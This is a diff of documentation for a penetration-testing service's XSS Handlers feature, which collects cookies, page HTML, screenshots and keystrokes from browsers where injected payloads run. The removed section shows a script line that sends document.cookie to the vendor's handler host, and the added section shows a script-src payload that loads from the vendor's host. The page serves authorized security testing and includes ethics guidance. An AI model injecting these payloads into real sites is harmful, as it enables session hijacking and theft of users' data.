@@ -1,94 +1,115 @@
 ---
-title: "XSS handlers"
+title: "XSS Handlers"
 description: "Capture and analyze cross-site scripting payload executions"
 ---
 
 ## Overview
 
-XSS Handlers provide callback endpoints for capturing XSS payload executions, helping you validate and demonstrate XSS vulnerabilities.
+XSS Handlers provide callback endpoints that capture data when XSS payloads execute in victim browsers. Use them to validate XSS vulnerabilities and demonstrate real-world impact by capturing cookies, screenshots, keystrokes, and page content.
 
-## What it does
+XSS Handlers are an **exploit helper tool**: they receive callbacks from injected payloads to prove XSS exploitation. They do not add data to your [Attack Surface](/using/attack-surface/attack-surface-overview) and do not generate [findings](/using/findings/findings). Captured data is displayed in a custom report.
 
-<CardGroup cols={2}>
-  <Card title="Callback capture" icon="bullseye">
-    Receive XSS execution callbacks
-  </Card>
-  <Card title="Data collection" icon="database">
-    Capture cookies and data
-  </Card>
-  <Card title="Proof generation" icon="certificate">
-    Generate exploitation evidence
-  </Card>
-  <Card title="Real-time alerts" icon="bell">
-    Instant notification of hits
-  </Card>
-</CardGroup>
-
-## How to use
+## How it works
 
 <Steps>
-  <Step title="Create handler">
-    Generate a unique handler endpoint.
+  <Step title="Create a handler">
+    Configure what data to capture and get a unique handler ID.
   </Step>
-  <Step title="Craft payload">
-    Build an XSS payload using the handler URL.
+  <Step title="Generate payload">
+    Use the provided JavaScript payload containing your handler URL.
   </Step>
   <Step title="Inject payload">
-    Test the payload in the target application.
+    Insert the payload into a vulnerable application.
   </Step>
-  <Step title="Monitor results">
-    View callbacks when payloads execute.
+  <Step title="Capture callbacks">
+    When a victim's browser executes the payload, data is sent to your handler.
+  </Step>
+  <Step title="Review results">
+    View captured data in the handler's report.
   </Step>
 </Steps>
 
-## Handler types
+## Creating a handler
 
-| Type | Purpose | Data captured |
-|------|---------|---------------|
-| Basic | Simple execution proof | Timestamp, source |
-| Cookie | Cookie exfiltration | Cookies, headers |
-| DOM | DOM data capture | Page content, localStorage |
-| Screenshot | Visual capture | Page screenshot |
+When creating a handler, configure what data to capture:
 
-## Example payloads
+| Option | Description |
+|--------|-------------|
+| **Label** | Unique identifier for the handler (alphanumeric, dashes, underscores, dots) |
+| **Get cookies** | Capture `document.cookie` from the victim's browser |
+| **Get HTML content** | Capture the full HTML of the page where the payload executed |
+| **Get page screenshot** | Capture a visual screenshot of the page using html2canvas |
+| **Get keystrokes** | Log keystrokes on the page after payload execution |
 
-### Basic callback
+<Note>
+Enable only the options you need. Capturing screenshots increases payload size and may be blocked by some Content Security Policies.
+</Note>
 
-```javascript
-<script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID"</script>
+## Payload format
+
+After creating a handler, you receive a JavaScript payload to inject:
+
+```html
+<script src='https://app.pentest-tools.com/xss-payload/YOUR_HANDLER_ID/'></script>
 ```
 
-### Cookie capture
-
-```javascript
-<script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID?c="+document.cookie</script>
-```
+The payload automatically:
+- Sends selected data to your handler
+- Works across different browsers
+- Handles CORS via the script tag injection method
 
 ## Captured data
 
-For each callback:
-- Timestamp
-- Source IP
-- Cookies (if captured)
-- Referer header
-- User agent
-- Custom parameters
+For each callback received, the handler captures:
+
+| Data | Description |
+|------|-------------|
+| **Cookies** | Browser cookies accessible via JavaScript (if enabled) |
+| **URL** | The full URL where the payload executed |
+| **Page screenshot** | Visual capture of the page (if enabled) |
+| **Keystrokes** | Keys typed after payload execution (if enabled) |
+| **User Agent** | Victim's browser user agent string |
+| **Timestamp** | Date and time of the callback |
+| **IP Address** | Source IP of the callback request |
+
+## Handler limits
+
+| Limit | Value |
+|-------|-------|
+| **Active duration** | 60 days from creation |
+| **Data entries per handler** | 500 callbacks maximum |
+| **Handlers per user** | 300 maximum |
+
+<Note>
+Handlers automatically expire after 60 days. Create a new handler if you need to continue testing.
+</Note>
+
+## Why use XSS Handlers
+
+- **Prove exploitation**: Demonstrate that XSS payloads actually execute, not just reflect
+- **Capture evidence**: Collect cookies, screenshots, and other data for reports
+- **Show real impact**: Prove session hijacking is possible by capturing session cookies
+- **Document findings**: Generate PDF reports with captured data for stakeholders
+- **Test stored XSS**: Verify that stored payloads execute when other users view the page
 
 <Warning>
-XSS handlers capture real data. Handle captured cookies and session data responsibly and delete after testing.
+XSS Handlers capture real data from victim browsers. Handle captured cookies and session data responsibly and delete after testing concludes.
 </Warning>
 
-## Use cases
+## Ethical considerations
 
-- Validate reflected XSS
-- Prove stored XSS impact
-- Demonstrate session hijacking risk
-- Document for reports
+- Only test applications you have authorization to assess
+- Minimize data capture, collect only what's needed to prove the vulnerability
+- Delete captured data after the engagement
+- Do not use captured session tokens to access victim accounts beyond demonstration
+- Report findings responsibly to the application owner
 
-<Tip>
-Use XSS handlers to provide undeniable proof of exploitation in your security reports.
-</Tip>
+## Follow-up actions
 
-## Related tools
+After capturing XSS callbacks:
 
-- [Website Vulnerability Scanner](/tools/website-vulnerability-scanner) — Comprehensive web app testing
+- **Document the finding**: Include captured data (sanitized) in your security report
+- **Assess cookie scope**: Check if captured cookies grant access to sensitive functionality
+- **Test other injection points**: Use [Website Scanner](/tools/website-scanner) to find additional XSS vulnerabilities
+- **Check for stored XSS**: Verify if the payload persists and affects other users
+- **Review CSP**: Analyze Content Security Policy headers that could mitigate XSS
